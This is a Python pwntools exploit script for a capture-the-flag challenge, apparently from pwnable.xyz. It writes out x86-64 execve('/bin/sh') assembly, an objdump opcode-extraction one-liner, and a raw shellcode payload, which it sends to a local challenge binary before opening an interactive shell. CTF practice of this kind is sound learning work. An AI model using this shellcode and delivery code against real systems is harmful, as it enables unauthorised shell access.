from pwn import *

'''
nasm -f elf64 shell.asm -o shell.o
ld -o shell shell.o
'''

import time
'''
# Grabbing the opcodes from shellcode
printf '\\x' && objdump -d shell | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '
\xb8\x3b\x00\x00\x00\x48\x8d\x3d\xf4\x0f\x00\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05\xb8\x3c\x00\x00\x00\
x48\x31\xff\x0f\x05 
'''

# ok, so the 0x00 opcode is used to do addition I guess?
# 
r = process('./challenge')
""" r = remote('svc.pwnable.xyz', 30025) """
l = r.recvline()
num = l.decode().split("0x")[1].strip()
num = int(num, 16)
r.sendlineafter("> ", str(num) + " " + "0")

# problem is that some of these are bad characters so the exploit might fail?
'''
section .text
global main
main:
    mov rdi, 0x68732F6E69622F
    push rdi
    push rsp
    pop rdi
    mov rax,59
    xor rsi,rsi
    xor rdx,rdx
    syscall
    
    mov rax, 60
    xor rdi,rdi
'''
# payload generated with this
payload = '\x00\xd8\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x54\x5f\xb8\x3b\x00\x00\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05\xb8\x3c\x00\x00\x00\x48\x31\xff\x0f\x05'

""" gdb.attach(r, gdbscript=''' """
""" b mmap """
""" ''') """
""" time.sleep(1) """

r.sendafter(": ", payload)

r.interactive()
